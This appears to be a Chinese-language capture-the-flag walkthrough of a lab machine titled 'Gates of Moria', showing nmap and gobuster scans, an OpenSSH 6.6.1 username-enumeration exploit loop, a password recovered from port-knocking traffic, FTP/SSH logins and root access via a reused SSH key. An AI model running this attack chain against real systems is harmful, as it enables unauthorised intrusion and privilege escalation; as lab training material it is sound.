
## 扫描

>**nmap 扫描结果**
```bash
┌──(kali㉿DESKTOP-SH1BMBR)-[~/work10]
└─$ nmapShell.sh
please input the ip address :192.168.80.138
start scan 192.168.80.138
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 14:53 CST
Nmap scan report for 192.168.80.138
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 14:54 CST
Nmap scan report for 192.168.80.138
Host is up (0.0029s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 14:54 CST
Nmap scan report for 192.168.80.138
Host is up (0.0031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey:
|   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)
|   256 85:cd:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)
|_  256 b1:77:7e:08:b3:a0:84:f8:f4:5d:f9:8e:d5:85:b9:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Gates of Moria
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (97%), Linux 3.10 - 4.11 (94%), Linux 5.1 (94%), Linux 3.13 - 3.16 (94%), Linux 4.10 (94%), Linux 2.6.32 (93%), Linux 3.4 - 3.10 (93%), Linux 4.15 - 5.8 (93%), Linux 4.4 (93%), Linux 2.6.32 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   1.06 ms DESKTOP-SH1BMBR (172.26.32.1)
2   4.96 ms 192.168.80.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.07 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 14:54 CST
Nmap scan report for 192.168.80.138
Host is up (0.0026s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-enum:
|   /w/: Potentially interesting folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing

Nmap done: 1 IP address (1 host up) scanned in 36.47 seconds
```


> **目录扫描结果**
```bash
sudo gobuster dir -u "http://192.168.80.138/" -x txt,php,xml,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/index.php            (Status: 200) [Size: 85]
	/w                    (Status: 301) [Size: 232] [--> http://192.168.80.138/w/]
	Progress: 1323360 / 1323366 (100.00%)
	===============================================================
	Finished
	===============================================================

 sudo gobuster dir -u "http://192.168.80.138/w/h/i/s/p/e/r/the_abyss/" -x txt,php,xml,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/index.php            (Status: 200) [Size: 19]
	/random.txt           (Status: 200) [Size: 407]
	Progress: 1323360 / 1323366 (100.00%)
	===============================================================
	Finished
	===============================================================
最终得到得到目录random.txt
cewl http://192.168.80.138/w/h/i/s/p/e/r/the_abyss/ -w dict.txt



```

> **openssh 6.6.1漏洞利用**
```bash
for i in $(cat dict.txt);do python2 45939.py 192.168.80.138 $i | grep "\[+\]";sleep 3 ;done
```
> [+] **Balrog** is a valid username
> [+] **Ori** is a valid username


```
用wireshark抓包，看到敲门的端口，转ascuii后发现密码
	Mellon69
用两个得到的用户名进行尝试
成功登录ftp，发现了网站根目录下有QlVraKW4fbIkXau9zkAPNGzviT3UKntl文件夹
得到hash解码后用ssh登录Ori
```

## 提权


>**suid**
```
bash-4.2$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/Xorg
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper
```
>**可写文件**

```
bash-4.2$ find / -writable -type f 2>/dev/null | grep -v /sys | grep -v /proc
/var/spool/mail/Ori
/home/Ori/.ssh/id_rsa
/home/Ori/.ssh/id_rsa.pub
/home/Ori/.ssh/known_hosts
/home/Ori/.bash_history

查看家目录的known_hosts

提权：ssh -i id_rsa root@127.0.0.1

```